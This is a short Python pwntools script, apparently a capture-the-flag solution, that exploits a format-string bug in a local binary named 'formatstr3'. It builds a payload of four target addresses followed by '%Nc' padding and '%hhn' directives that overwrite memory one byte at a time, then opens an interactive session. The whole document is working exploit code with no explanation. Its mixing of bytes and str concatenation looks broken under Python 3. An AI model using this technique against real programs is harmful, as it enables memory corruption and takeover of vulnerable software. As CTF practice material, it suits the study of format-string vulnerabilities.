from pwn import *

p = process('./formatstr3')

passcode = 0x0101010c

payload = b''
payload += p32(passcode)
payload += p32(passcode+1)
payload += p32(passcode+2)
payload += p32(passcode+3)

a = 0x102 - 16 # 242
b = 0x201 - (16 + a) # 255 
c = 0x204 - (16 + a + b) # 3
d = 0x303 - (16 + a + b + c) # 255

payload += '%{}c'.format(a)
payload += '%5$hhn'

payload += '%{}c'.format(b)
payload += '%6$hhn'

payload += '%{}c'.format(c)
payload += '%7$hhn'

payload += '%{}c'.format(d)
payload += '%8$hhn'

print(payload)
p.send(payload)
p.interactive()
